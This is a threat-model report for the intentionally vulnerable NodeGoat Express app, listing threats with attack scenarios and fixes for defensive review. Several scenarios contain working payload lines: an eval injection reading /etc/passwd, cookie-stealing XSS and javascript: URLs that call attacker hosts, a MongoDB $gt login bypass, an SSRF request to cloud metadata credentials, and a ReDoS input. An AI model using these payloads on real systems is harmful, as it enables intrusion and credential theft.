threats.attackScenario: An authenticated user submits POST /contributions with preTax set to a JavaScript payload such as `require('child_process').execSync('cat /etc/passwd')` or `while(1){}`, which app/routes/contributions.js lines 32-34 pass straight into eval(), executing the attacker's code inside the Express process or spinning the event loop so the whole site stops responding.
threats.impactReason: Arbitrary code execution in the app process gives the attacker the MongoDB connection, all user records including SSNs and bank routing numbers, and the ability to halt the server.
threats.likelihoodReason: Any self-registered, logged-in user can POST the three form fields; the payload is passed to eval() with no sanitisation at all.

mitigation.summary: Replace eval() with numeric parsing for the contribution fields.
steps: Change app/routes/contributions.js lines 32-34 to use parseInt(req.body.preTax, 10), parseInt(req.body.afterTax, 10) and parseInt(req.body.roth, 10) as the commented-out fix already shows.
Keep the isNaN and range checks after parsing and reject non-integer input before it reaches ContributionsDAO.
Add a regression test posting `1;process.exit()` to POST /contributions and assert a validation error.

threats.title: GET /learn requests and their session cookie travel over plaintext HTTP
threats.asset: session cookie
threats.attackScenario: server.js:145 starts the app with http.createServer and the HTTPS block at lines 149-155 is commented out, so an attacker on the same café Wi-Fi as an employee sniffs the plaintext GET /learn?url=... request, lifts the connect.sid session cookie from the Cookie header, and replays it to reach /profile with the victim's SSN and bank routing number.
assumptions: No TLS termination exists anywhere in front of nodegoat-web, so credentials and session cookies are assumed to travel in plaintext.
No TLS-terminating reverse proxy sits in front of the Express server in the deployed environment.
threats.impactReason: A captured session cookie yields full account takeover including SSN, DOB and bank account details.
threats.likelihoodReason: Passive interception requires network position, but the cookie is also missing secure/httpOnly settings in server.js so no transport protection exists at all. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Serve the application over HTTPS and mark the session cookie secure.
steps: Uncomment and use the https.createServer block in server.js:149-155 (or terminate TLS at a proxy and set app.set('trust proxy', 1)).
Enable the commented cookie options in the session middleware at server.js:92-100 with httpOnly: true and secure: true.
Add HSTS via the already-declared helmet dependency.

threats.title: Open redirect on GET /learn sends authenticated users to attacker-controlled sites
threats.asset: user session state and user credentials (via phishing on a spoofed login page)
threats.attackScenario: app/routes/index.js:72 passes req.query.url straight to res.redirect, so an attacker mails a logged-in employee the trusted link https://nodegoat.example/learn?url=https://evil.example/login, the browser follows the 302 to the attacker's cloned RetireEasy login page, and the victim types their userName and password into the attacker's form.
threats.impactReason: Credentials harvested through the spoofed page give full access to the victim's profile, SSN, DOB and bank account numbers.
threats.likelihoodReason: The redirect target is entirely attacker-controlled through a query string and the link originates on the application's own trusted domain; only a logged-in victim is needed.

mitigation.summary: Restrict /learn redirects to an allow-list of known paths or hosts.
steps: In app/routes/index.js:70-73, compare req.query.url against a fixed allow-list of learning-resource URLs and respond 400 when it does not match.
If relative navigation is required, accept only a path key (e.g. ?page=a1) and map it server-side to the destination rather than echoing a caller-supplied URL.

threats.title: Redirect target from GET /learn is unvalidated and accepts javascript: and data: schemes
threats.asset: user session state
threats.attackScenario: The GET /learn handler at app/routes/index.js:70 reads req.query.url without any scheme or format validation, so an attacker crafts /learn?url=javascript:fetch('https://evil.example/?c='+document.cookie) or a CRLF-laden value and relies on the browser or proxy handling of the Location header to run script or split the response in the victim's session context.
assumptions: No upstream middleware normalises or scheme-checks req.query.url before the handler runs.
threats.impactReason: Script executing in the RetireEasy origin can read the session cookie and the dashboard's financial data.
threats.likelihoodReason: The parameter is trivially reachable by any logged-in user, though modern browsers block some of the dangerous schemes in Location headers.

mitigation.summary: Validate the /learn url parameter before redirecting.
steps: Parse req.query.url with the Node URL API in app/routes/index.js and reject anything whose protocol is not http: or https:.
Strip CR and LF characters from the value before it reaches res.redirect.

threats.title: Responses to browser navigations carry no security headers, so injected content executes unchecked
threats.asset: user session state and rendered financial data
threats.attackScenario: The HTTP responses carried on this browser flow are emitted with no Content-Security-Policy, X-Frame-Options or X-Content-Type-Options, so an attacker who lands any script into a rendered page (for example the memos list) has no CSP blocking exfiltration to evil.example, and can also frame /allocations/:userId in an invisible iframe for clickjacking.
assumptions: No reverse proxy injects security headers in front of the Express app.
threats.impactReason: Missing CSP and frame protections remove the last line of defence for script injection and UI redressing against pages showing contribution percentages and allocations.
threats.likelihoodReason: Every response on this unauthenticated-reachable browser flow is affected, though exploitation still needs a second injection or social-engineering step.

mitigation.summary: Enable helmet, which is already a declared dependency.
steps: Uncomment the helmet require at server.js:10 and register helmet() before the routes are mounted at server.js:132.
Configure contentSecurityPolicy, frameguard and noSniff, and call app.disable('x-powered-by').

threats.title: Login body fields reach MongoDB as objects, allowing NoSQL operator injection to bypass authentication
threats.asset: session identifiers and the admin role flag
threats.attackScenario: handleLoginRequest at app/routes/session.js:53 destructures userName straight out of req.body and hands it to usersCol.findOne({userName: userName}) in app/data/user-dao.js:91 with no type check, so an attacker posts a JSON body {"userName":{"$gt":""},"password":"x"} to POST /login and MongoDB returns the first user document; combined with the plaintext comparison at user-dao.js:61 the attacker can enumerate and target the admin account.
assumptions: bodyParser.json() accepts a JSON login body, so req.body.userName can be an object rather than a string.
threats.impactReason: Authentication bypass or account selection yields a session for an arbitrary user including the admin, exposing all employees' financial data.
threats.likelihoodReason: The endpoint is public, JSON bodies are parsed, and no type validation exists anywhere on the path from req.body to findOne.

mitigation.summary: Coerce and validate login inputs to strings before querying MongoDB.
steps: In app/routes/session.js:53-58, reject the request unless typeof userName === 'string' && typeof password === 'string'.
In app/data/user-dao.js:91 pass String(userName) into the findOne filter.
Store password hashes with bcrypt (the bcrypt-nodejs dependency is already present) and compare with bcrypt.compareSync instead of the === at user-dao.js:61.

threats.title: POST /login credentials are submitted over plaintext HTTP
threats.asset: user credentials (userName and password)
threats.attackScenario: The login form posts userName and password to POST /login (app/routes/index.js:34) while server.js:145 listens with http.createServer and the HTTPS setup at server.js:149-155 stays commented out, so an attacker sharing the network segment captures the urlencoded body and reads the victim's cleartext password, then signs in and reads their SSN and bank routing number on /profile.
assumptions: No TLS termination exists anywhere in front of nodegoat-web, so credentials and session cookies are assumed to travel in plaintext.
No TLS-terminating reverse proxy fronts the application in the deployed environment.
threats.impactReason: Cleartext passwords are reusable and the account exposes SSN, date of birth and bank account numbers.
threats.likelihoodReason: Interception needs network adjacency, but the credentials are sent with no transport protection at all and passwords are stored unhashed so they match the database value directly. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Force credential submission over TLS.
steps: Switch server.js to the https.createServer block at lines 149-155, or terminate TLS at a proxy and redirect all http traffic to https.
Enable HSTS through the already-declared helmet dependency in server.js.

threats.title: Unthrottled POST /login permits credential stuffing and password brute force
threats.asset: user credentials and the admin role flag
threats.attackScenario: An attacker scripts thousands of POST /login requests to app/routes/index.js:34 with a wordlist against the userName 'admin', and because handleLoginRequest in app/routes/session.js:53 returns the distinct message 'Invalid username' when the account does not exist, the attacker first enumerates valid accounts and then brute forces their short (1-20 character, no complexity) passwords unimpeded.
assumptions: No rate limiting or lockout is applied, so login and signup are assumed to be brute-forceable without restriction.
No rate limiting, account lockout or CAPTCHA is applied in front of POST /login by the application or any fronting proxy.
threats.impactReason: A guessed admin password grants the isAdmin path and every employee's benefits and personal financial data.
threats.likelihoodReason: The endpoint is unauthenticated, publicly reachable, and the differentiated error messages make username enumeration free. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Throttle and lock out repeated failed logins, and return a single generic error.
steps: Add per-IP and per-account rate limiting in front of app.post('/login') in app/routes/index.js:34.
In app/routes/session.js:53-95 return the identical errorMessage 'Invalid username and/or password' for both noSuchUser and invalidPassword cases, as the commented fix suggests.
Log failed authentication attempts with the account and source address for detection.

threats.title: CSRF on POST /memos lets an attacker publish memos as a victim user
threats.asset: the shared memos collection and the victim user's identity on it
threats.attackScenario: With csurf disabled (server.js:7, 104-113) POST /memos at app/routes/index.js:67 trusts the session cookie alone, so an attacker's page auto-submits a form with a memo field to /memos and a logged-in victim's browser silently publishes attacker-chosen content — including an XSS payload — to the memo list shared with all users.
assumptions: The session cookie has no SameSite restriction, so it is sent on cross-site form POSTs.
threats.impactReason: Content attributable to the victim is injected into a board read by all users, and can carry a script payload.
threats.likelihoodReason: Needs a victim to visit an attacker page while logged in, but the POST requires no token.

mitigation.summary: Require a CSRF token on POST /memos.
steps: Uncomment the csurf middleware in server.js (lines 7 and 104-113).
Render {{csrftoken}} as a hidden input in the memos form template and verify it on app/routes/index.js:67.

threats.title: Stored XSS through POST /memos reaching every user because swig autoescape is disabled and no CSP is set
threats.asset: session cookies and rendered pages of every user who opens /memos
threats.attackScenario: memosDAO.insert stores req.body.memo verbatim (app/routes/memos.js:13) and the memo is rendered by swig with autoescape: false (server.js:135-142) with no Content-Security-Policy response header, so an attacker posts a memo containing <script>fetch('//attacker/?c='+document.cookie)</script> via POST /memos and steals the session cookie of every user who later loads the shared memos page.
assumptions: The memos template renders the memo body with an unescaped/raw output expression rather than applying an explicit escape filter.
threats.impactReason: Memos are shared with all users, so one payload hijacks every session that views the page, including administrators.
threats.likelihoodReason: Any logged-in user can post a memo and no output encoding or CSP stands in the way.

mitigation.summary: Escape memo output and add a content security policy.
steps: Set autoescape: true in swig.setDefaults in server.js:135-142 as the commented fix indicates.
Sanitise or HTML-encode req.body.memo in app/routes/memos.js:13 before storing, using the node-esapi dependency already in package.json.
Enable helmet.contentSecurityPolicy() in server.js (helmet is already a dependency) so injected inline script does not execute.

threats.title: Unbounded memo body on POST /memos allows storage exhaustion of the shared memos collection
threats.asset: availability of the memos feature and MongoDB storage
threats.attackScenario: app/routes/memos.js:13 passes req.body.memo straight to memosDAO.insert with no length or rate check, so a logged-in attacker scripts repeated POST /memos requests with multi-megabyte memo bodies until the MongoDB memos collection fills the disk and every user's /memos page render becomes unusable.
assumptions: No rate limiting or lockout is applied, so login and signup are assumed to be brute-forceable without restriction.
No rate limiting or request body size cap beyond body-parser's default is applied in front of POST /memos.
threats.impactReason: Degrades or disables the shared memos feature and can exhaust database storage for the whole application.
threats.likelihoodReason: Any registered user can loop the request; no special position is needed, though volume is required to matter. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Validate memo length and rate-limit memo creation.
steps: Reject req.body.memo longer than a fixed maximum in app/routes/memos.js before calling memosDAO.insert.
Apply a per-session request rate limit to POST /memos in app/routes/index.js:67.
Set an explicit limit option on bodyParser.urlencoded/json in server.js:71-75.

threats.title: CSRF on POST /profile lets an attacker overwrite a victim's SSN and bank details
threats.asset: stored SSN, date of birth, address and bank account/routing numbers of the victim user
threats.attackScenario: csurf is commented out in server.js:7 and 104-113 so POST /profile (app/routes/index.js:48) accepts any request bearing the session cookie; an attacker hosts a page that auto-submits a hidden form with ssn, dob, bankAcc and bankRouting to /profile, and a logged-in RetireEasy user who visits it has their banking details silently replaced with the attacker's account.
assumptions: No SameSite attribute is set on the session cookie, so browsers attach it to the cross-site form POST.
threats.impactReason: Payroll/retirement funds can be redirected by rewriting the victim's bank account and routing numbers.
threats.likelihoodReason: Requires luring an authenticated user to an attacker page, but the request itself needs no token or secret.

mitigation.summary: Enable CSRF tokens on all state-changing POST routes.
steps: Uncomment the csurf middleware and res.locals.csrftoken block in server.js (lines 7, 104-113); csurf is already a dependency in package.json.
Add the hidden csrftoken input to app/views/profile.html and the other POST forms.
Set cookie: { sameSite: 'lax', httpOnly: true } in the express-session options in server.js.

threats.title: Cleartext HTTP submission of POST /profile exposes SSN, DOB and bank routing numbers
threats.asset: SSN, date of birth, bank account and routing numbers, and the session cookie
threats.attackScenario: server.js:145 starts the app with http.createServer and leaves the https.createServer block commented out at lines 149-155, so an attacker on the same Wi-Fi or upstream network sniffs the POST /profile form body carrying ssn, dob, bankAcc and bankRouting (app/routes/profile.js:42-50) in cleartext and also replays the captured connect.sid cookie to impersonate the victim.
assumptions: No TLS termination exists anywhere in front of nodegoat-web, so credentials and session cookies are assumed to travel in plaintext.
No TLS-terminating reverse proxy sits in front of the Node process in the deployed environment.
threats.impactReason: Full identity and banking detail set for a user, plus a reusable session cookie, is disclosed in one capture.
threats.likelihoodReason: Any network path observer can read the traffic; no attacker privileges are required beyond shared-network position. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Serve the application over HTTPS only and mark session cookies secure.
steps: Uncomment and use the https.createServer block in server.js (lines 149-155) or terminate TLS at a proxy and redirect all HTTP to HTTPS.
Enable the session cookie options in server.js:92-100 with httpOnly: true and secure: true.
Add HSTS via the already-declared helmet dependency in package.json.

threats.title: Catastrophic ReDoS via bankRouting field on POST /profile stalls the whole event loop
threats.asset: availability of the RetireEasy web application for all users
threats.attackScenario: An authenticated attacker submits POST /profile with bankRouting set to a long run of digits with no trailing '#' (for example 60 zeroes), which the nested-quantifier regex /([0-9]+)+\#/ at app/routes/profile.js:59 backtracks over exponentially, pinning the single Node event loop and blocking every other request until the process is restarted.
assumptions: No rate limiting or lockout is applied, so login and signup are assumed to be brute-forceable without restriction.
threats.impactReason: A single request takes the whole single-threaded server down for all users, including login and dashboard.
threats.likelihoodReason: Reachable by any self-registered logged-in user with one ordinary form POST and a trivially crafted string. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Replace the nested-quantifier regex with a linear-time validation of the routing number.
steps: Change the pattern at app/routes/profile.js:59 to /^[0-9]+#$/ (drop the outer + quantifier) as the comment at line 58 already suggests.
Additionally cap the length of req.body.bankRouting before testing it, rejecting inputs longer than the expected routing-number length.

threats.title: Plaintext HTTP transport of the /research request exposes the session cookie
threats.asset: session cookie
threats.attackScenario: server.js:145 starts the app with http.createServer (the https branch is commented out at lines 149-155) and the express-session cookie at server.js:78-102 is configured with no secure or httpOnly flags, so an attacker on the same Wi-Fi as a NodeGoat user captures the plaintext GET /research?url=&symbol= request and replays the connect.sid cookie to take over the victim's retirement account session.
assumptions: No TLS termination exists anywhere in front of nodegoat-web, so credentials and session cookies are assumed to travel in plaintext.
The application is reached over the plaintext HTTP listener rather than behind a TLS-terminating proxy.
threats.impactReason: A captured session cookie gives full access to the victim's profile, SSN, date of birth and bank account/routing numbers.
threats.likelihoodReason: Requires a network position between the browser and the server, but no authentication or application flaw is needed once there. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Serve the application over HTTPS and harden the session cookie.
steps: Re-enable the https.createServer block in server.js (lines 149-155) and remove the plaintext http.createServer listener at line 145.
Set cookie: { httpOnly: true, secure: true } in the express-session options at server.js:78.
Add helmet.hsts() (helmet is already declared in package.json) so browsers refuse plaintext requests.

threats.title: Attacker-controlled url parameter on GET /research turns the flow into a server-side request forgery and response-splitting channel
threats.asset: internal network responses and cloud instance metadata proxied back to the browser
threats.attackScenario: The /research flow carries url and symbol straight into app/routes/research.js:15-16 where they are concatenated and fetched with needle.get with no allowlist, so any logged-in user requests GET /research?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&symbol= and the raw internal response body is written back to them at research.js:25.
assumptions: No egress filtering or URL allowlist is applied in front of the needle.get call in app/routes/research.js.
threats.impactReason: Internal-only services and cloud metadata credentials can be read through the application's own network position.
threats.likelihoodReason: Any self-registered, logged-in user can trigger it with a single crafted query string; no special tooling is needed.

mitigation.summary: Restrict the outbound research fetch to a fixed, validated stock-data endpoint.
steps: Remove req.query.url from app/routes/research.js:15 and hardcode the research provider base URL in config/env/all.js.
Validate req.query.symbol against a strict pattern such as /^[A-Z.]{1,6}$/ before appending it.
Render the fetched body through the swig template rather than res.write so raw upstream HTML is not reflected verbatim.

threats.title: Missing security response headers let a malicious /research response body run script in the user's session origin
threats.asset: user session state and personal financial data rendered in the browser
threats.attackScenario: The response to GET /research?url=&symbol= is returned with no Content-Security-Policy, X-Frame-Options or X-Content-Type-Options because helmet is commented out in server.js (lines 10, 38-65), so an attacker lures a logged-in user to /research?url=http://attacker.example/payload.html&symbol=X and the attacker's HTML is written into the NodeGoat origin at app/routes/research.js:25 with no CSP to block the injected script that reads the dashboard and profile pages.
assumptions: No reverse proxy adds security headers in front of the Express app.
threats.impactReason: Script running in the application origin can read the victim's profile page containing SSN, date of birth and bank details.
threats.likelihoodReason: Requires the victim to follow a crafted /research link while logged in, which is a realistic phishing step.

mitigation.summary: Enable helmet security headers for all responses.
steps: Uncomment the helmet require at server.js:10 and register app.use(helmet.contentSecurityPolicy()), helmet.frameguard() and the dont-sniff-mimetype middleware (both already in package.json) before routes(app, db).
Call app.disable("x-powered-by") in server.js.
Stop writing upstream response bodies directly with res.write in app/routes/research.js.

threats.title: Signup credentials travel in cleartext and are stored unhashed, so capturing POST /signup yields reusable passwords
threats.asset: user credentials (userName and password)
threats.attackScenario: POST /signup submits userName and password over the plaintext HTTP listener created at server.js:145, and app/data/user-dao.js:20-31 writes the received password field into the users document verbatim with the bcrypt.hashSync line commented out, so an attacker sniffing the network captures the registration body and then logs in as that user at POST /login, and the same plaintext value also sits in the database for anyone who reads it.
assumptions: No TLS termination exists anywhere in front of nodegoat-web, so credentials and session cookies are assumed to travel in plaintext.
The signup form is served and submitted over the plaintext HTTP listener rather than through a TLS-terminating proxy.
threats.impactReason: Captured or dumped credentials grant full account takeover and are likely reused on other services by the same user.
threats.likelihoodReason: The weak storage is unconditional for every signup; interception additionally needs only a shared network segment. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Hash passwords on registration and carry the signup form over TLS.
steps: Uncomment the bcrypt.hashSync(password, bcrypt.genSaltSync()) line in app/data/user-dao.js:29 and remove the raw password assignment at line 25.
Change validateLogin in app/data/user-dao.js:60 to use bcrypt.compareSync against the stored hash.
Enable the https.createServer block in server.js (lines 149-155) so the signup POST body is encrypted in transit.
Tighten PASS_RE in app/routes/session.js:144 to the commented stronger pattern requiring 8+ mixed-case characters with digits.

threats.title: Signup input reaches the unescaped swig templates, allowing stored cross-site scripting
threats.asset: session cookie and personal financial data of users viewing the rendered name fields
threats.attackScenario: swig is configured with autoescape: false at server.js:135-142, and handleSignup in app/routes/session.js:206-218 re-renders signup.html with the submitted userName inside {{userNameError}} while firstName/lastName pass the permissive /^.{1,100}$/ checks into the user document, so an attacker registers with firstName set to <script>fetch('//attacker/'+document.cookie)</script> and the payload executes unescaped wherever that name is rendered through layout.html.
assumptions: The signup-supplied name fields are rendered by swig templates without an explicit per-variable escape filter.
threats.impactReason: Script in the application origin can steal the session cookie (no httpOnly flag is set at server.js:78) and read profile pages containing SSN and bank details.
threats.likelihoodReason: Any unauthenticated visitor can register with a scripted field and the validation regexes accept arbitrary characters.

mitigation.summary: Re-enable swig autoescaping and validate name fields.
steps: Set autoescape: true in the swig.setDefaults call at server.js:135.
Restrict FNAME_RE/LNAME_RE/USER_RE in app/routes/session.js:140-144 to a character class that excludes < > " and '.
Encode the error values rendered in app/views/signup.html:57 with node-esapi, which is already a dependency.

threats.title: Unauthenticated POST /signup has no rate limiting, allowing account-creation flooding
threats.asset: user account store and the userId counter collection
threats.attackScenario: POST /signup at app/routes/index.js:38 is registered without any throttling middleware and each call performs a findAndModify $inc on the counters collection plus a users insert (app/data/user-dao.js:38-46), so an attacker scripts thousands of concurrent signups with random userName values to exhaust the MongoDB connection and fill the users collection.
assumptions: No rate limiting or CAPTCHA is applied in front of the signup route by a proxy or middleware.
No rate limiting or lockout is applied, so login and signup are assumed to be brute-forceable without restriction.
threats.impactReason: Degrades or exhausts the shared MongoDB instance and pollutes the user namespace for legitimate registrations.
threats.likelihoodReason: The route is reachable by any unauthenticated stranger with a simple HTTP loop. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Throttle and challenge the signup endpoint.
steps: Add an express rate-limiting middleware in front of app.post("/signup", ...) in app/routes/index.js keyed by source IP.
Require a CAPTCHA or email verification before the userDAO.addUser call in app/routes/session.js:220.
Cap concurrent counter increments by rejecting requests once a per-IP daily signup quota is reached.

questions.text: Does the MongoDB instance used by data-access-layer and db-seed-script require authentication with a least-privilege user, rather than the open mongodb://mongo:27017/nodegoat connection string shown in docker-compose.yml?
questions.whyAsking: If MongoDB accepts unauthenticated connections, anyone who can reach the database port (including via a compromised container or misconfigured network) can read or modify all application data without needing any application credentials.
options: No, MongoDB has no auth and accepts the connection string as-is
Yes, MongoDB requires a username/password for a restricted user
Partial - auth is enabled but the app uses an admin/root account
questions.defaultAssumption: MongoDB is assumed to be running without authentication, exactly as the credential-less connection string in docker-compose.yml suggests.

questions.text: Is TLS terminated somewhere in front of nodegoat-web (e.g. a load balancer, reverse proxy, or ingress) so that login credentials and session cookies are never sent over plain HTTP, given the app's own server.js only starts an HTTP server?
questions.whyAsking: Without TLS anywhere in the path, login passwords and session cookies travel in cleartext and can be captured by anyone who can observe the network traffic.
options: No, traffic runs over plain HTTP end-to-end
Yes, a proxy/load balancer terminates TLS in front of the app
Unsure how this is deployed in production
questions.defaultAssumption: No TLS termination exists anywhere in front of nodegoat-web, so credentials and session cookies are assumed to travel in plaintext.

questions.text: Is there any rate limiting or account lockout on the login and signup endpoints to stop repeated password-guessing attempts?
questions.whyAsking: Without a limit on failed attempts, an attacker can script unlimited password guesses against any known username until one succeeds.
options: No, requests can be repeated without limit
Yes, there is throttling or lockout after failed attempts
Partial - only applied at an infrastructure/WAF layer outside the app
questions.defaultAssumption: No rate limiting or lockout is applied, so login and signup are assumed to be brute-forceable without restriction.
